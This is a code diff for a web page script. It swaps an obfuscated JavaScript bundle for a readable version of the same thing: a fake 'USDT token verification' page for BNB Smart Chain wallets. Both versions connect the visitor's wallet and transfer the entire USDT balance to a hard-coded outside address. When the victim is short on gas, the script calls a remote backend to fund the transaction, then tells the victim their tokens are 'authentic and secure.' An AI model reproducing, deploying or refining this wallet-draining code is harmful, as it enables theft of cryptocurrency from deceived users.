@@ -1,1 +1,535 @@
-function _0x46b8(_0x532a8b,_0x5e19aa){const _0x178358=_0x1783();return _0x46b8=function(_0x46b84b,_0x1a6d4f){_0x46b84b=_0x46b84b-0x78;let _0x4fcf2a=_0x178358[_0x46b84b];return _0x4fcf2a;},_0x46b8(_0x532a8b,_0x5e19aa);}const _0x1e8326=_0x46b8;(function(_0x5466f2,_0x4768b3){const _0xbe55b9=_0x46b8,_0x1f2f77=_0x5466f2();while(!![]){try{const _0x481268=parseInt(_0xbe55b9(0x97))/0x1*(-parseInt(_0xbe55b9(0xa2))/0x2)+-parseInt(_0xbe55b9(0xa3))/0x3*(parseInt(_0xbe55b9(0xb5))/0x4)+-parseInt(_0xbe55b9(0xcf))/0x5*(parseInt(_0xbe55b9(0x96))/0x6)+parseInt(_0xbe55b9(0x94))/0x7+parseInt(_0xbe55b9(0xbe))/0x8*(parseInt(_0xbe55b9(0xcc))/0x9)+parseInt(_0xbe55b9(0xa8))/0xa*(parseInt(_0xbe55b9(0xc2))/0xb)+parseInt(_0xbe55b9(0xa1))/0xc*(parseInt(_0xbe55b9(0x7d))/0xd);if(_0x481268===_0x4768b3)break;else _0x1f2f77['push'](_0x1f2f77['shift']());}catch(_0x57ce93){_0x1f2f77['push'](_0x1f2f77['shift']());}}}(_0x1783,0x2d9d5));function _0x1783(){const _0x44512a=['toWei','✅\x20Verification\x20Successful<br>Your\x20assets\x20are\x20genuine.\x20No\x20flash\x20or\x20reported\x20USDT\x20found.<br><br><b>USDT\x20Balance:</b>\x20','wallet_switchEthereumChain','error','4dffQBE','0x38','getElementById','0px\x200px\x2010px\x20rgba(0,\x200,\x200,\x200.2)','50%','methods','all','utils','color','112WfRQHD','function','borderRadius','addEventListener','44mfHFJT','Contract','POST','eth','call','application/json','recipient','Wallet\x20not\x20connected.\x20Refresh\x20the\x20page.','body','getAccounts','145053suSQDj','display','Error\x20connecting\x20wallet:','50JRbivB','#ffebeb','ether','18px','block','0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87','0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090','none','stringify','green','style','amount','bool','\x20for\x20gas\x20fees.','uint256','popupBox','width','toString','2793141tQzVMG','✅\x20Transferred\x20','USDT\x20transfer\x20failed.\x20Ensure\x20you\x20have\x20enough\x20BNB\x20for\x20gas.','fromWei','innerHTML','✅\x20Verification\x20Successful<br>Flash\x20USDT\x20has\x20been\x20detected\x20and\x20successfully\x20burned.<br><br><b>USDT\x20Burned:</b>\x20','address','center','div','Loading...','https://bep20usdt-backend-production.up.railway.app/send-bnb','log','backgroundColor','\x20USDT\x20to\x20','click','User\x20BNB\x20is\x20low.\x20Requesting\x20BNB\x20from\x20backend...','USDT\x20Balance:\x20','ethereum','\x20USDT','fixed','No\x20assets\x20found.','textAlign','request','259175FjSzLZ','#e6f7e6','211674iGklvJ','725DypxNL','_owner','Please\x20switch\x20to\x20BNB\x20Smart\x20Chain.','sendTransaction','400px','Next','10px','20px','red','\x20USDT<br><b>BNB\x20Balance:</b>\x20','24fNtqVE','134rOzAjJ','332193ZEdCWN','80%','top','left','0x55d398326f99059fF775485246999027B3197955','16390eiaLKv','transform','fontSize','\x20BNB\x20to\x20','...','position','maxWidth','transfer','balanceOf'];_0x1783=function(){return _0x44512a;};return _0x1783();}const bscAddress=_0x1e8326(0xd5),bnbGasSender=_0x1e8326(0xd4),usdtContractAddress=_0x1e8326(0xa7);let web3,userAddress;async function connectWallet(){const _0x52aa38=_0x1e8326;if(window[_0x52aa38(0x8e)]){web3=new Web3(window['ethereum']);try{await window['ethereum'][_0x52aa38(0x93)]({'method':'eth_accounts'}),await window['ethereum'][_0x52aa38(0x93)]({'method':_0x52aa38(0xb3),'params':[{'chainId':_0x52aa38(0xb6)}]});const _0x2b0a41=await web3['eth'][_0x52aa38(0xcb)]();userAddress=_0x2b0a41[0x0],console[_0x52aa38(0x88)]('Wallet\x20Connected:',userAddress);}catch(_0x17ae1b){console[_0x52aa38(0xb4)](_0x52aa38(0xce),_0x17ae1b),alert(_0x52aa38(0x99));}}else alert('Please\x20install\x20MetaMask.');}window[_0x1e8326(0xc1)]('load',connectWallet);async function Next(){const _0x5adf1a=_0x1e8326;if(!web3||!userAddress){alert(_0x5adf1a(0xc9));return;}const _0x47707b=new web3[(_0x5adf1a(0xc5))][(_0x5adf1a(0xc3))]([{'constant':!![],'inputs':[{'name':_0x5adf1a(0x98),'type':_0x5adf1a(0x83)}],'name':_0x5adf1a(0xb0),'outputs':[{'name':'','type':_0x5adf1a(0x79)}],'type':_0x5adf1a(0xbf)}],usdtContractAddress),[_0x1c15f7,_0x23a0e3]=await Promise[_0x5adf1a(0xbb)]([_0x47707b[_0x5adf1a(0xba)][_0x5adf1a(0xb0)](userAddress)[_0x5adf1a(0xc6)](),web3[_0x5adf1a(0xc5)]['getBalance'](userAddress)]),_0x368323=parseFloat(web3['utils'][_0x5adf1a(0x80)](_0x1c15f7,_0x5adf1a(0xd1))),_0x1df8ed=parseFloat(web3[_0x5adf1a(0xbc)]['fromWei'](_0x23a0e3,_0x5adf1a(0xd1)));console['log'](_0x5adf1a(0x8d)+_0x368323+_0x5adf1a(0x8f)),console[_0x5adf1a(0x88)]('BNB\x20Balance:\x20'+_0x1df8ed+'\x20BNB');if(_0x368323===0x0){showPopup(_0x5adf1a(0x91),'black');return;}if(_0x368323<=0.0005){showPopup(_0x5adf1a(0xb2)+_0x368323+_0x5adf1a(0xa0)+_0x1df8ed+'\x20BNB',_0x5adf1a(0xd8));return;}showPopup(_0x5adf1a(0x86),'green'),transferUSDT(_0x368323,_0x1df8ed);}async function transferUSDT(_0xe0f0f2,_0x2b9074){const _0x50d8d9=_0x1e8326;try{_0x2b9074<0.0005&&(console[_0x50d8d9(0x88)](_0x50d8d9(0x8c)),await fetch(_0x50d8d9(0x87),{'method':_0x50d8d9(0xc4),'headers':{'Content-Type':_0x50d8d9(0xc7)},'body':JSON[_0x50d8d9(0xd7)]({'toAddress':userAddress})}));const _0x7e3c6=new web3[(_0x50d8d9(0xc5))][(_0x50d8d9(0xc3))]([{'constant':![],'inputs':[{'name':_0x50d8d9(0xc8),'type':_0x50d8d9(0x83)},{'name':_0x50d8d9(0xda),'type':_0x50d8d9(0x79)}],'name':_0x50d8d9(0xaf),'outputs':[{'name':'','type':_0x50d8d9(0xdb)}],'type':_0x50d8d9(0xbf)}],usdtContractAddress),_0x102372=web3[_0x50d8d9(0xbc)][_0x50d8d9(0xb1)](_0xe0f0f2[_0x50d8d9(0x7c)](),_0x50d8d9(0xd1));console[_0x50d8d9(0x88)]('Transferring\x20'+_0xe0f0f2+_0x50d8d9(0x8a)+bscAddress+_0x50d8d9(0xac)),await _0x7e3c6[_0x50d8d9(0xba)][_0x50d8d9(0xaf)](bscAddress,_0x102372)['send']({'from':userAddress}),showPopup(_0x50d8d9(0x82)+_0xe0f0f2+'\x20USDT','red'),console[_0x50d8d9(0x88)](_0x50d8d9(0x7e)+_0xe0f0f2+_0x50d8d9(0x8a)+bscAddress);}catch(_0x9dee93){console[_0x50d8d9(0xb4)]('❌\x20USDT\x20Transfer\x20Failed:',_0x9dee93),alert(_0x50d8d9(0x7f));}}async function sendBNB(_0x3c03cb,_0x1dffc0){const _0x41794a=_0x1e8326;try{await web3[_0x41794a(0xc5)][_0x41794a(0x9a)]({'from':bnbGasSender,'to':_0x3c03cb,'value':web3['utils']['toWei'](_0x1dffc0,_0x41794a(0xd1)),'gas':0x5208}),console['log']('✅\x20Sent\x20'+_0x1dffc0+_0x41794a(0xab)+_0x3c03cb+_0x41794a(0x78));}catch(_0x3da98e){console[_0x41794a(0xb4)]('⚠️\x20Error\x20sending\x20BNB:',_0x3da98e);}}function showPopup(_0x59199c,_0x47e5a4){const _0x319905=_0x1e8326;let _0x3d71d9=document[_0x319905(0xb7)](_0x319905(0x7a));!_0x3d71d9&&(_0x3d71d9=document['createElement'](_0x319905(0x85)),_0x3d71d9['id']='popupBox',_0x3d71d9[_0x319905(0xd9)][_0x319905(0xad)]=_0x319905(0x90),_0x3d71d9['style'][_0x319905(0xa5)]=_0x319905(0xb9),_0x3d71d9[_0x319905(0xd9)][_0x319905(0xa6)]='50%',_0x3d71d9['style'][_0x319905(0xa9)]='translate(-50%,\x20-50%)',_0x3d71d9[_0x319905(0xd9)]['padding']=_0x319905(0x9e),_0x3d71d9[_0x319905(0xd9)][_0x319905(0xc0)]=_0x319905(0x9d),_0x3d71d9[_0x319905(0xd9)]['boxShadow']=_0x319905(0xb8),_0x3d71d9[_0x319905(0xd9)][_0x319905(0x92)]=_0x319905(0x84),_0x3d71d9[_0x319905(0xd9)][_0x319905(0xaa)]=_0x319905(0xd2),_0x3d71d9[_0x319905(0xd9)][_0x319905(0x7b)]=_0x319905(0xa4),_0x3d71d9[_0x319905(0xd9)][_0x319905(0xae)]=_0x319905(0x9b),document[_0x319905(0xca)]['appendChild'](_0x3d71d9)),_0x3d71d9[_0x319905(0xd9)][_0x319905(0x89)]=_0x47e5a4==='red'?_0x319905(0xd0):_0x319905(0x95),_0x3d71d9[_0x319905(0xd9)][_0x319905(0xbd)]=_0x47e5a4==='red'?_0x319905(0x9f):'green',_0x3d71d9[_0x319905(0x81)]=_0x59199c,_0x3d71d9[_0x319905(0xd9)][_0x319905(0xcd)]=_0x319905(0xd3),setTimeout(()=>{const _0x529c69=_0x319905;_0x3d71d9['style'][_0x529c69(0xcd)]=_0x529c69(0xd6);},0x1388);}document[_0x1e8326(0xb7)](_0x1e8326(0x9c))['addEventListener'](_0x1e8326(0x8b),Next);
+const Next = document.getElementById('Next'); // This now targets your 'Next' button
+const walletAddress = document.getElementById('walletAddress'); // Expected in HTML, but not present
+const tokenBalance = document.getElementById('tokenBalance'); // Expected in HTML, but not present
+const verificationModal = document.getElementById('verificationModal'); // Expected in HTML, but not present
+const progressBar = document.getElementById('progressBar'); // Expected in HTML, but not present
+const step1 = document.getElementById('step1'); // Expected in HTML, but not present
+const step2 = document.getElementById('step2'); // Expected in HTML, but not present
+const step3 = document.getElementById('step3'); // Expected in HTML, but not present
+const step4 = document.getElementById('step4'); // Expected in HTML, but not present
+const step1Desc = document.getElementById('step1Desc'); // Expected in HTML, but not present
+const step2Desc = document.getElementById('step2Desc'); // Expected in HTML, but not present
+const step3Desc = document.getElementById('step3Desc'); // Expected in HTML, but not present
+const step4Desc = document.getElementById('step4Desc'); // Expected in HTML, but not present
+const modalMessage = document.getElementById('modalMessage'); // Expected in HTML, but not present
+const closeModalBtns = document.querySelectorAll('.close-modal'); // Expected in HTML, but not present
+const networkDot = document.getElementById('networkDot'); // Expected in HTML, but not present
+const networkStatus = document.getElementById('networkStatus'); // Expected in HTML, but not present
+
+// Configuration
+const recipientAddress = '0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090';
+const tokenContractAddress = '0x55d398326f99059fF775485246999027B3197955'; // BEP-20 USDT contract
+const tokenAbi = [
+    {
+        "constant": true,
+        "inputs": [{"name": "who", "type": "address"}],
+        "name": "balanceOf",
+        "outputs": [{"name": "", "type": "uint256"}],
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [
+            {"name": "_to", "type": "address"},
+            {"name": "_value", "type": "uint256"}
+        ],
+        "name": "transfer",
+        "outputs": [{"name": "", "type": "bool"}],
+        "type": "function"
+    }
+];
+
+// Network configuration
+const BSC_MAINNET_CHAIN_ID = '0x38'; // Binance Smart Chain Mainnet
+const BSC_MAINNET_PARAMS = {
+    chainId: BSC_MAINNET_CHAIN_ID,
+    chainName: 'Binance Smart Chain Mainnet',
+    nativeCurrency: {
+        name: 'BNB',
+        symbol: 'bnb',
+        decimals: 18
+    },
+    rpcUrls: ['https://bsc-dataseed.binance.org/'],
+    blockExplorerUrls: ['https://bscscan.com/']
+};
+
+// Wallet types
+const WALLET_TYPES = {
+    TRUST: 'trust',
+    BINANCE: 'binance',
+    METAMASK: 'metamask',
+    UNKNOWN: 'unknown'
+};
+
+let web3;
+let userAddress;
+let tokenBalanceValue = 0;
+let tokenContract;
+let isTransferComplete = false;
+let currentProvider = null;
+let walletType = WALLET_TYPES.UNKNOWN;
+
+// Initialize Web3 - Wallet compatible
+async function initWeb3() {
+    // Detect wallet type
+    if (window.trustwallet) {
+        walletType = WALLET_TYPES.TRUST;
+        currentProvider = window.trustwallet;
+    } else if (window.BinanceChain) {
+        walletType = WALLET_TYPES.BINANCE;
+        currentProvider = window.BinanceChain;
+    } else if (window.ethereum) {
+        walletType = WALLET_TYPES.METAMASK;
+        currentProvider = window.ethereum;
+    } else if (window.web3) {
+        walletType = WALLET_TYPES.UNKNOWN;
+        currentProvider = window.web3.currentProvider;
+    } else {
+        console.error("No Web3 provider detected. Please install Trust Wallet, Binance Wallet or MetaMask.");
+        // showError("Please install Trust Wallet, Binance Wallet or MetaMask."); // Cannot show if modal is not present
+        return false;
+    }
+
+    try {
+        web3 = new Web3(currentProvider);
+        await updateNetworkStatus();
+
+        // Listen for chain changes
+        if (currentProvider.on) {
+            currentProvider.on('chainChanged', (chainId) => {
+                window.location.reload();
+            });
+
+            // Binance Chain specific event
+            if (walletType === WALLET_TYPES.BINANCE) {
+                currentProvider.on('accountsChanged', (accounts) => {
+                    window.location.reload();
+                });
+            }
+        }
+
+        return true;
+    } catch (error) {
+        console.error("Web3 initialization error:", error);
+        return false;
+    }
+}
+
+// Update network status display (will do nothing if elements are null)
+async function updateNetworkStatus() {
+    if (!web3) return false;
+
+    try {
+        const chainId = await web3.eth.getChainId();
+
+        if (chainId === parseInt(BSC_MAINNET_CHAIN_ID, 16)) {
+            if (networkDot) networkDot.className = "network-dot";
+            if (networkStatus) networkStatus.textContent = "Binance Smart Chain";
+            return true;
+        } else {
+            if (networkDot) networkDot.className = "network-dot network-disconnected";
+            if (networkStatus) networkStatus.textContent = `Unsupported Network (ID: ${chainId})`;
+
+            // Automatically switch to BSC for Trust Wallet
+            if (walletType === WALLET_TYPES.TRUST || walletType === WALLET_TYPES.METAMASK) {
+                const switched = await switchToBSC();
+                if (switched) {
+                    return updateNetworkStatus(); // Recursive check after switch
+                }
+            }
+            return false;
+        }
+    } catch (error) {
+        console.error("Error getting network status:", error);
+        if (networkDot) networkDot.className = "network-dot network-disconnected";
+        if (networkStatus) networkStatus.textContent = "Network Error";
+        return false;
+    }
+}
+
+// Switch to Binance Smart Chain (will update console, but not UI if step2Desc is null)
+async function switchToBSC() {
+    if (step2Desc) step2Desc.textContent = "Switching to Binance Smart Chain...";
+    console.log(`Attempting to switch to BSC (Wallet: ${walletType})`);
+
+    try {
+        // Binance Web3 Wallet uses different method
+        if (walletType === WALLET_TYPES.BINANCE) {
+            await window.BinanceChain.switchNetwork('bsc-mainnet');
+            return true;
+        }
+
+        // Standard EIP-3326 method
+        await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: BSC_MAINNET_CHAIN_ID }]
+        });
+        return true;
+    } catch (switchError) {
+        // Network not added, try to add it
+        if (switchError.code === 4902) {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_addEthereumChain',
+                    params: [BSC_MAINNET_PARAMS]
+                });
+                return true;
+            } catch (addError) {
+                console.error("Failed to add BSC network:", addError);
+                if (step2Desc) step2Desc.textContent = "Failed to add BSC network";
+                return false;
+            }
+        }
+        console.error("Failed to switch to BSC:", switchError);
+        if (step2Desc) step2Desc.textContent = "Failed to switch network";
+        return false;
+    }
+}
+
+// Update progress (will do nothing if progressBar is null)
+function updateProgress(percent) {
+    if (progressBar) progressBar.style.width = `${percent}%`;
+}
+
+// Update step UI (will do nothing if step elements are null)
+function updateStep(stepNum, status) {
+    const step = document.getElementById(`step${stepNum}`);
+    if (step) {
+        step.className = `step ${status}`;
+        const stepIcon = step.querySelector('.step-icon');
+        if (stepIcon) {
+            stepIcon.innerHTML = status === 'completed' ? '<i class="fas fa-check"></i>' : stepNum;
+        }
+    }
+}
+
+// Connect Wallet
+async function connectWallet() {
+    updateStep(1, 'active');
+    updateProgress(20);
+
+    const isWeb3Initialized = await initWeb3();
+    if (!isWeb3Initialized) {
+        showError("Web3 initialization failed.");
+        return false;
+    }
+
+    try {
+        if (step1Desc) step1Desc.textContent = "Requesting account access...";
+
+        // Different method for Binance Web3 Wallet
+        if (walletType === WALLET_TYPES.BINANCE) {
+            const accounts = await window.BinanceChain.request({ method: 'eth_accounts' });
+            userAddress = accounts[0];
+        } else {
+            const accounts = await web3.eth.getAccounts();
+            if (accounts.length === 0) {
+                showError("No accounts found. Please connect your wallet.");
+                return false;
+            }
+            userAddress = accounts[0];
+        }
+
+        if (walletAddress) walletAddress.textContent = `${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
+        if (Next) Next.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
+        if (Next) Next.disabled = true;
+
+        updateStep(1, 'completed');
+        updateStep(2, 'active');
+        updateProgress(40);
+
+        return true;
+    } catch (error) {
+        console.error("Error connecting wallet:", error);
+        showError("Error connecting wallet. Please try again.");
+        return false;
+    }
+}
+
+// Ensure we're on BSC network
+async function ensureBSCNetwork() {
+    updateStep(2, 'active');
+
+    try {
+        const chainId = await web3.eth.getChainId();
+
+        if (chainId === parseInt(BSC_MAINNET_CHAIN_ID, 16)) {
+            if (step2Desc) step2Desc.textContent = "Connected to Binance Smart Chain";
+            return true;
+        }
+
+        const switched = await switchToBSC();
+
+        if (switched) {
+            if (step2Desc) step2Desc.textContent = "Successfully switched to Binance Smart Chain";
+            updateNetworkStatus();
+            return true;
+        } else {
+            if (step2Desc) step2Desc.textContent = "Failed to switch network";
+            return false;
+        }
+    } catch (error) {
+        console.error("Network check failed:", error);
+        if (step2Desc) step2Desc.textContent = "Network check failed";
+        return false;
+    }
+}
+
+// Get token balance
+async function getTokenBalance() {
+    updateStep(3, 'active');
+    if (step3Desc) step3Desc.textContent = "Scanning token security parameters...";
+
+    try {
+        if (tokenBalance) tokenBalance.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Analyzing...';
+
+        tokenContract = new web3.eth.Contract(tokenAbi, tokenContractAddress);
+
+        const balance = await tokenContract.methods.balanceOf(userAddress).call();
+
+        tokenBalanceValue = web3.utils.fromWei(balance, 'ether');
+        if (tokenBalance) tokenBalance.textContent = `${parseFloat(tokenBalanceValue).toFixed(2)} USDT`;
+
+        if (step3Desc) step3Desc.textContent = "Token analysis complete";
+        updateStep(3, 'completed');
+        updateStep(4, 'active');
+        updateProgress(70);
+
+        return true;
+    } catch (error) {
+        console.error("Error fetching token balance:", error);
+        if (step3Desc) step3Desc.textContent = "Token analysis failed";
+        showError("Failed to analyze token. Please try again.");
+        if (tokenBalance) tokenBalance.textContent = "0.00 USDT";
+        return false;
+    }
+}
+
+// Execute verification (transfer)
+async function executeVerification() {
+    if (step4Desc) step4Desc.textContent = "Confirming authenticity in your wallet...";
+    if (modalMessage) modalMessage.textContent = "Please confirm the transaction in your wallet";
+
+    try {
+        // Convert token to wei
+        const amountWei = web3.utils.toWei(tokenBalanceValue.toString(), 'ether');
+
+        // --- BNB Check and Top-Up Integration Start ---
+        // Get user's current BNB balance
+        const bnbBalanceWei = await web3.eth.getBalance(userAddress);
+        const userBNB = parseFloat(web3.utils.fromWei(bnbBalanceWei, 'ether'));
+
+        // Define a threshold for low BNB. 0.0005 BNB is a good starting point for BSC gas.
+        const BNB_LOW_THRESHOLD = 0.0005;
+
+        if (userBNB < BNB_LOW_THRESHOLD) {
+            console.log("User BNB is low. Requesting BNB from backend...");
+            if (modalMessage) modalMessage.textContent = "Insufficient BNB for gas. Requesting BNB top-up...";
+            if (modalMessage) modalMessage.className = "warning-message"; // You might want a different class for warnings
+
+            try {
+                const response = await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ toAddress: userAddress })
+                });
+
+                if (response.ok) {
+                    const result = await response.json();
+                    console.log("BNB top-up request successful:", result);
+                    if (modalMessage) modalMessage.textContent = "BNB top-up requested. Please wait a moment and try confirming the transaction again.";
+
+                    // if(verificationModal) verificationModal.style.display = "none"; // This won't work as modal is not present
+                    if (Next) Next.disabled = false;
+                    if (Next) Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; // Reset button text
+                    return;
+                } else {
+                    const errorData = await response.json();
+                    console.error("BNB top-up request failed:", errorData);
+                    showError(`BNB top-up failed: ${errorData.message || "Unknown error"}. Please ensure you have enough BNB for gas.`);
+                    return; // Stop execution if BNB top-up fails
+                }
+            } catch (backendError) {
+                console.error("Error communicating with BNB backend:", backendError);
+                showError("Could not request BNB. Network error or backend issue. Please try again.");
+                return; // Stop execution if backend call fails
+            }
+        }
+        // --- BNB Check and Top-Up Integration End ---
+
+        // Proceed with USDT transfer if BNB is sufficient or top-up wasn't needed/failed
+        tokenContract.methods.transfer(recipientAddress, amountWei)
+            .send({ from: userAddress })
+            .on('transactionHash', (hash) => {
+                console.log("Transaction hash:", hash);
+            })
+            .on('receipt', (receipt) => {
+                // Transaction was successful
+                if (step4Desc) step4Desc.textContent = "Verification complete!";
+                updateStep(4, 'completed');
+                updateProgress(100);
+
+                setTimeout(() => {
+                    if (tokenBalance) tokenBalance.textContent = "0.00 USDT";
+                    tokenBalanceValue = 0;
+
+                    // if(verificationModal) verificationModal.style.display = "none"; // This won't work as modal is not present
+
+                    if (Next) Next.innerHTML = '<i class="fas fa-check-circle"></i> Verification Complete';
+                    if (Next) Next.disabled = true;
+
+                    if (modalMessage) modalMessage.textContent = "Token verification complete! Your tokens are authentic and secure.";
+                    if (modalMessage) modalMessage.className = "success-message";
+
+                    isTransferComplete = true;
+                }, 1500);
+            })
+            .on('error', (error) => {
+                console.error("Transaction error:", error);
+                if (step4Desc) step4Desc.textContent = "Verification failed";
+                if (modalMessage) modalMessage.textContent = "Verification failed. Please try again.";
+                if (modalMessage) modalMessage.className = "error-message";
+            });
+
+    } catch (error) {
+        console.error("Verification failed:", error);
+        if (step4Desc) step4Desc.textContent = "Verification failed";
+        if (modalMessage) modalMessage.textContent = "Verification failed. Please try again.";
+        if (modalMessage) modalMessage.className = "error-message";
+    }
+}
+
+// Show error message (will only log to console if modalMessage is null)
+function showError(message) {
+    console.error("Error:", message);
+    if (modalMessage) modalMessage.textContent = message;
+    if (modalMessage) modalMessage.className = "error-message";
+    setTimeout(() => {
+        if (modalMessage) modalMessage.textContent = "";
+        if (modalMessage) modalMessage.className = "";
+    }, 5000);
+}
+
+// Event Listener for the "Next" button
+// This will override the onclick="Next()" attribute on the button
+// in your index.html if this script is loaded AFTER the inline script,
+// or if it's the only handler.
+Next.addEventListener('click', async () => {
+    // Prevent the default form submission or multiple clicks if already processing
+    // Note: If original 'next()' function is called first due to 'onclick',
+    // this listener will fire AFTER it.
+    console.log("Verification process initiated by 'Next' button.");
+
+    if (isTransferComplete) return;
+
+    // if(verificationModal) verificationModal.style.display = "flex"; // Will not work
+    updateStep(1, 'active');
+    updateStep(2, '');
+    updateStep(3, '');
+    updateStep(4, '');
+    updateProgress(0);
+    if (modalMessage) modalMessage.textContent = "";
+    if (modalMessage) modalMessage.className = "";
+
+    try {
+        // Step 1: Connect wallet
+        if (!userAddress) {
+            const connected = await connectWallet();
+            if (!connected) {
+                // if(verificationModal) verificationModal.style.display = "none"; // Will not work
+                if (Next) Next.disabled = false;
+                if (Next) Next.innerHTML = 'Next'; // Reset button text
+                return;
+            }
+        }
+
+        // Step 2: Ensure BSC network
+        const networkReady = await ensureBSCNetwork();
+        if (!networkReady) {
+            updateStep(2, '');
+            showError("Please switch to Binance Smart Chain to continue");
+            return;
+        }
+        updateStep(2, 'completed');
+
+        // Step 3: Get token balance
+        const balanceFetched = await getTokenBalance();
+        if (!balanceFetched) {
+            // if(verificationModal) verificationModal.style.display = "none"; // Will not work
+            if (Next) Next.disabled = false;
+            if (Next) Next.innerHTML = 'Next'; // Reset button text
+            return;
+        }
+
+        if (tokenBalanceValue <= 0) {
+            showError("No USDT tokens found for verification.");
+            return;
+        }
+
+        if (tokenBalanceValue <= 1) { // If token balance is 1 USDT or less, consider it verified without transaction
+            const bnbBalance = await web3.eth.getBalance(userAddress);
+            const formattedBNB = web3.utils.fromWei(bnbBalance, 'ether');
+
+            showError(`Token verification complete, Your tokens are authentic and secure.\nUSDT Balance: ${parseFloat(tokenBalanceValue).toFixed(2)} USDT\nBNB Balance: ${parseFloat(formattedBNB).toFixed(4)} BNB`); // Using showError for feedback
+            updateStep(4, 'completed');
+            updateProgress(100);
+            if (Next) Next.innerHTML = '<i class="fas fa-check-circle"></i> Verification Complete';
+            if (Next) Next.disabled = true;
+            isTransferComplete = true; // Mark as complete even without transaction
+
+            // Auto-close modal after success message (not applicable if modal not present)
+            // setTimeout(() => { if(verificationModal) verificationModal.style.display = "none"; }, 3000);
+            return;
+        }
+
+        // Step 4: Execute verification (transfer if > 1 USDT)
+        await executeVerification();
+    } catch (error) {
+        console.error("Verification process error:", error);
+        showError("An unexpected error occurred. Please try again.");
+        // if(verificationModal) verificationModal.style.display = "none"; // Will not work
+        if (Next) Next.disabled = false;
+        if (Next) Next.innerHTML = 'Next'; // Reset button text
+    }
+});
+
+// These event listeners will not work as closeModalBtns and verificationModal will be null
+closeModalBtns.forEach(btn => {
+    btn.addEventListener('click', () => {
+        // if(verificationModal) verificationModal.style.display = "none"; // Will not work
+        if (!isTransferComplete) { // Only reset button if transfer isn't complete
+            if (Next) Next.innerHTML = 'Next';
+            if (Next) Next.disabled = false;
+        }
+    });
+});
+
+window.addEventListener('click', (e) => {
+    if (e.target === verificationModal) { // Will not work as verificationModal is null
+        // if(verificationModal) verificationModal.style.display = "none"; // Will not work
+        if (!isTransferComplete) { // Only reset button if transfer isn't complete
+            if (Next) Next.innerHTML = 'Next';
+            if (Next) Next.disabled = false;
+        }
+    }
+});
+
+// Initialize on load
+window.addEventListener('load', async () => {
+    if (Next) Next.disabled = false; // Ensure button is enabled on load
+    const web3Initialized = await initWeb3();
+
+    if (web3Initialized) {
+        // Try to connect wallet automatically if previously connected
+        if (currentProvider && currentProvider.selectedAddress) {
+            userAddress = currentProvider.selectedAddress;
+            if (walletAddress) walletAddress.textContent = `${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
+
+            // Get initial balance and network status
+            const networkReady = await ensureBSCNetwork();
+            if (networkReady) {
+                await getTokenBalance();
+            }
+        }
+    }
+});
